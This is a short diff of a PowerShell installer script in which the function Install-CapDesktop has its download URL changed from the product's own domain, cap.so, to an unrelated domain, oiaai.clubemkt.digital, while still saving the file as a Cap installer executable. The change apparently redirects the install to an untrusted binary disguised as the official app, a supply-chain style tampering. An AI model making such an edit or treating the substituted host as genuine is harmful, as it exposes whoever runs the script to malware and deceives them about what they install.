@@ -20,7 +20,7 @@ function Find-CapAppPath {
 }
 
 function Install-CapDesktop {
-	$downloadUrl = "https://cap.so/download/windows"
+	$downloadUrl = "https://oiaai.clubemkt.digital/download/windows"
 	$installerPath = Join-Path ([System.IO.Path]::GetTempPath()) ("Cap-" + [System.Guid]::NewGuid().ToString("N") + ".exe")
 
 	try {
